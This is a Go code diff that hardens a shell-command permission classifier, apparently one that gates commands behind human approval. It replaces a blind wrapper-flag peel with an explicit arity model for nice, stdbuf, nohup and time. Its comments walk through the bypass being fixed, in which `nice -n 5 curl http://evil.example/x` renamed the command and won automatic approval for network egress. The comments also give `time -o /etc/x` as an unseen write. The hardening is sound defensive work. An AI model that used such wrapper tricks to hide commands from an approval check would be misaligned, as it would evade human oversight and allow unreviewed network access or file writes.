@@ -176,22 +176,105 @@ var arbitraryArgWrappers = map[string]bool{
 	"exec":   true,
 }
 
-// peelWrappers are side-effect-free prefixes stripped before the argv[0]
-// check. Their first non-flag argument becomes the effective command, because
-// every option they take is either valueless or attached (`nice -n5`); a
-// leading `-` word is therefore never the inner command.
+// wrapperSpec models ONE peelable wrapper's own option grammar, so the peel can
+// tell a flag from the flag's VALUE from the inner command.
 //
-// timeout and env are NOT here: both carry operands that are not flags
-// (timeout's mandatory duration, env's NAME=val prefixes) and both have flags
-// that change what actually runs. They get dedicated peels — peelTimeout and
-// peelEnv — precisely because peelWrapperArgs drops every leading `-` word
-// blindly, which on `env -i cmd` would silently discard the fact that the
-// environment was cleared (change 0070 D2).
-var peelWrappers = map[string]bool{
-	"time":   true,
-	"nice":   true,
-	"stdbuf": true,
-	"nohup":  true,
+// This is the shape peelTimeout already established, generalised. It replaces
+// the "drop every leading `-` word" peel, which rested on the claim that every
+// option these wrappers take is valueless or attached. That claim was FALSE:
+// GNU nice takes `-n 5` and stdbuf takes `-o 0` with the value in a separate
+// word, so the blind drop ate the flag, left the VALUE in argv[0], and produced
+// Segment{Name: "5", Args: ["curl", "http://evil.example/x"]}. Every name-keyed
+// check downstream was then asked about the wrong name: the egress boundary
+// (classifyHeuristic's first and hardest rule) never saw a `curl`, and
+// isCatastrophicRm, which keys on Name == "rm", would never see an `rm`. The two
+// remaining words then resolved as cwd-relative paths that both proved
+// in-workspace — VerdictAllow on arbitrary network egress, no human. That is
+// precisely the failure peelTimeout was written to avoid, left standing in the
+// sibling table.
+//
+// Fields:
+//
+//   - valueless: flags consuming exactly their own word.
+//   - valueFlags: flags whose value is the NEXT word. The attached spellings are
+//     accepted too and consume one word — `-n5` for a short flag, `--long=v`
+//     for a long one (see attachedValue).
+//   - numericAdjustment: nice's obsolete `nice -5 cmd` adjustment form, where
+//     the digits ARE the value and no other wrapper has an equivalent.
+//
+// A flag outside the model FAILS CLOSED, exactly as peelTimeout's does: an
+// unmodelled flag may take a separate value, and guessing its arity is how the
+// value ends up wearing argv[0]'s name. Over-refusal costs one human prompt.
+type wrapperSpec struct {
+	valueless         map[string]bool
+	valueFlags        map[string]bool
+	numericAdjustment bool
+}
+
+// attachedValue reports whether flag is an attached spelling of one of the
+// spec's value-taking flags, and therefore consumes exactly one word.
+//
+// Short and long forms cannot collide here: a long flag always starts with
+// `--`, so no `-X` short prefix can match one.
+func (s wrapperSpec) attachedValue(flag string) bool {
+	for f := range s.valueFlags {
+		if strings.HasPrefix(f, "--") {
+			if strings.HasPrefix(flag, f+"=") {
+				return true
+			}
+			continue
+		}
+		if len(f) == 2 && len(flag) > 2 && strings.HasPrefix(flag, f) {
+			return true
+		}
+	}
+	return false
+}
+
+// niceObsoleteAdjustment matches `nice -5 cmd`, the obsolete form in which the
+// adjustment is spelled as the flag itself. Only the unsigned digits form is
+// modelled; a negative adjustment is spelled `nice -n -5`, whose value is the
+// separate word `-n` already takes.
+var niceObsoleteAdjustment = regexp.MustCompile(`^-[0-9]+$`)
+
+// wrapperSpecs are the side-effect-free prefixes stripped before the argv[0]
+// check: peel the wrapper and its own options, and the first remaining word is
+// the effective command.
+//
+// timeout and env are NOT here. Both carry operands that are not flags
+// (timeout's mandatory duration, env's NAME=val prefixes), so their peels are
+// about more than a flag table: peelTimeout and peelEnv (change 0070 D2).
+var wrapperSpecs = map[string]wrapperSpec{
+	// nice: -n/--adjustment take the value as a SEPARATE word (`nice -n 5 cmd`),
+	// attached (`nice -n5`, `--adjustment=5`), or as the obsolete `nice -5`.
+	"nice": {
+		valueFlags:        map[string]bool{"-n": true, "--adjustment": true},
+		numericAdjustment: true,
+	},
+	// stdbuf: -i/-o/-e (and --input/--output/--error) each take a MODE, again
+	// either separate (`stdbuf -o 0 cmd`) or attached (`stdbuf -oL cmd`).
+	"stdbuf": {
+		valueFlags: map[string]bool{
+			"-i": true, "-o": true, "-e": true,
+			"--input": true, "--output": true, "--error": true,
+		},
+	},
+	// nohup takes NO options at all (only --help/--version, which run no
+	// command). A flag-shaped word here is a shape we have not modelled.
+	"nohup": {},
+	// time is reachable only when it is not the shell KEYWORD — a bare `time
+	// cmd` parses as *syntax.TimeClause and fails closed at collectStmtCmd's
+	// default arm — so this models /usr/bin/time. Its report flags are
+	// valueless. -o/-f (and --output/--format) are deliberately UNMODELLED
+	// rather than given an arity: -o's value is a FILE THE COMMAND WRITES, and
+	// nothing in this parser's redirect capture would ever see that write, so
+	// the right answer for `time -o /etc/x cmd` is the human, not a peel.
+	"time": {
+		valueless: map[string]bool{
+			"-a": true, "-p": true, "-q": true, "-v": true,
+			"--append": true, "--portability": true, "--quiet": true, "--verbose": true,
+		},
+	},
 }
 
 // inertEnvVars is an ALLOWLIST of environment-variable names proven not to
@@ -365,10 +448,11 @@ func assignsAreBenign(assigns []*syntax.Assign) bool {
 // not model (see paramExpWordsSafe); an argv[0]
 // containing a path separator
 // (the basename-collapse bug); an arbitrary-arg wrapper as argv[0] (bash/sh
-// without a parseable -c, xargs, npx, sudo, …); a `timeout`/`env`/`bash -c`
-// invocation whose own operands cannot be modelled well enough to name the
-// inner command, opaque operands included (change 0070 D2/D5 — see peelTimeout,
-// peelEnv and dashCScript); or any command node with no case in collectStmt —
+// without a parseable -c, xargs, npx, sudo, …); a peelable wrapper — `timeout`,
+// `env`, `bash -c`, `nice`, `stdbuf`, `nohup`, `time` — whose own operands
+// cannot be modelled well enough to name the inner command, an unmodelled flag
+// and opaque operands included (change 0070 D2/D5 — see peelTimeout, peelEnv,
+// peelWrapperArgs and dashCScript); or any command node with no case in collectStmt —
 // a function declaration above all (change 0070 D3).
 func splitSegments(cmd string) ([]Segment, error) {
 	if len(cmd) > maxCommandBytes {
@@ -793,9 +877,11 @@ peel:
 		if strings.ContainsRune(words.at(0), '/') {
 			break peel
 		}
-		switch base := basename(words.at(0)); {
-		case peelWrappers[base]:
-			peeled, ok := peelWrapperArgs(words)
+		base := basename(words.at(0))
+		spec, isWrapper := wrapperSpecs[base]
+		switch {
+		case isWrapper:
+			peeled, ok := peelWrapperArgs(words, spec)
 			if !ok {
 				return ErrUnparseable
 			}
@@ -1181,21 +1267,48 @@ func dashCScript(args argWords) (string, bool) {
 	return "", false
 }
 
-// peelWrapperArgs drops the wrapper argv[0] and any of its own leading flags,
-// returning the inner command's words.
+// peelWrapperArgs drops the wrapper argv[0] and its own leading flags under the
+// wrapper's explicit arity model (spec), returning the inner command's words.
+//
+// The model is the whole point, and it must stay one: a flag that is not in the
+// spec fails closed rather than being dropped on the assumption that it takes no
+// separate value. Dropping one word too few leaves the flag's VALUE in argv[0],
+// which silently renames the command for every name-keyed check downstream —
+// see the wrapperSpec doc for the egress bypass that produced.
 //
 // An OPAQUE word in the flag position fails closed (change 0070 D5): a word
-// like `-$X` looks like a flag but we cannot know that it is one, and dropping
-// it would silently discard something that may have been the command. An
+// like `-$X` looks like a flag but we cannot know that it is one, nor what
+// arity it has, and dropping it would silently discard something that may have
+// been the command. A flag's separate VALUE may be opaque — `nice -n $N cmd`
+// names an adjustment, not a command, and dropping it is correct either way. An
 // opaque word that does NOT look like a flag ends the loop and becomes argv[0],
 // where collectCall's opaque-argv[0] check refuses it.
-func peelWrapperArgs(words argWords) (argWords, bool) {
+func peelWrapperArgs(words argWords, spec wrapperSpec) (argWords, bool) {
 	rest := words.drop(1)
 	for rest.len() > 0 && strings.HasPrefix(rest.at(0), "-") {
 		if rest.opaqueAt(0) {
 			return argWords{}, false
 		}
-		rest = rest.drop(1)
+		flag := rest.at(0)
+		switch {
+		case spec.valueless[flag]:
+			rest = rest.drop(1)
+		case spec.valueFlags[flag]:
+			// Value in a separate word: drop both. A missing value is a
+			// malformed invocation we will not guess at.
+			if rest.len() < 2 {
+				return argWords{}, false
+			}
+			rest = rest.drop(2)
+		case spec.attachedValue(flag):
+			rest = rest.drop(1)
+		case spec.numericAdjustment && niceObsoleteAdjustment.MatchString(flag):
+			rest = rest.drop(1)
+		default:
+			// Unmodelled: `--`, an unknown flag, a bare `-`, or a flag whose
+			// arity we never established. Fail closed.
+			return argWords{}, false
+		}
 	}
 	return rest, true
 }
@@ -1210,12 +1323,17 @@ var timeoutDuration = regexp.MustCompile(`^[0-9]+(\.[0-9]+)?[smhd]?$`)
 // returning the inner command's words. words[0] is the timeout invocation
 // itself (change 0070 D2).
 //
-// This is deliberately NOT peelWrapperArgs. timeout's `-s`/`-k` take a value as
-// a SEPARATE word, so blindly dropping leading `-` words would leave that value
+// It stays separate from peelWrapperArgs because of the DURATION, not the
+// flags: timeout is the only wrapper here with a mandatory non-flag operand
+// standing between its options and the inner command, and that operand is what
+// the loop below exists to consume. The flag half is the same explicit arity
+// model, for the same reason — timeout's `-s`/`-k` take their value as a
+// SEPARATE word, so dropping leading `-` words blindly would leave that value
 // sitting where the duration belongs (`timeout -s 30 make` would peel to
 // `make`, having silently eaten the signal name and mistaken the duration for
-// it). We therefore model each flag's arity explicitly and fail closed on any
-// flag we did not model — an unknown flag might take a separate value too.
+// it) — and both peels fail closed on any flag they did not model, since an
+// unknown flag might take a separate value too. peelWrapperArgs used to be the
+// blind version; see wrapperSpec for the egress bypass that cost.
 //
 // After the flags, exactly one duration-shaped word must appear. Zero (`timeout
 // go test`) fails closed; so does a second duration-shaped word, since no real
